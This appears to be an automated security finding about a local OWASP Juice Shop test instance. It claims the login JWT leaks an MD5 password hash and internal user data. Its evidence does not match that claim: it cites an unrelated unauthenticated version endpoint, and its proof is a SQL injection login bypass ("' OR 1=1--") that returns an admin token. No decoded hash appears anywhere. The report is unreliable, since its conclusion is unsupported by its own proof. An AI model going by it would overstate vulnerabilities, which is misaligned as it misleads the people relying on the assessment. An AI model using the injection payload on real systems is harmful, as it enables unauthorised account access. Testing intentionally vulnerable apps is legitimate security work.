title: JWT Token Exposes Password Hash and Internal Data
description: The JWT token issued upon login contains sensitive user data in its payload, including the password hash (MD5), email, role, and other internal user fields. Base64 decoding the JWT payload reveals all this data in plaintext. This violates the principle of least privilege and exposes password hashes to anyone who intercepts the token.
poc: Probe request against JWT token from POST http://127.0.0.1:3010/rest/user/login; observed proving result from prior stage handoff: GET /rest/admin/application-version returned {"version":"20.1.1"} without authentication
proof: POST with payload {"email":"' OR 1=1--","password":"test"} returned 200 with body containing "authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..."} and "umail":"admin@juice-sh.op"
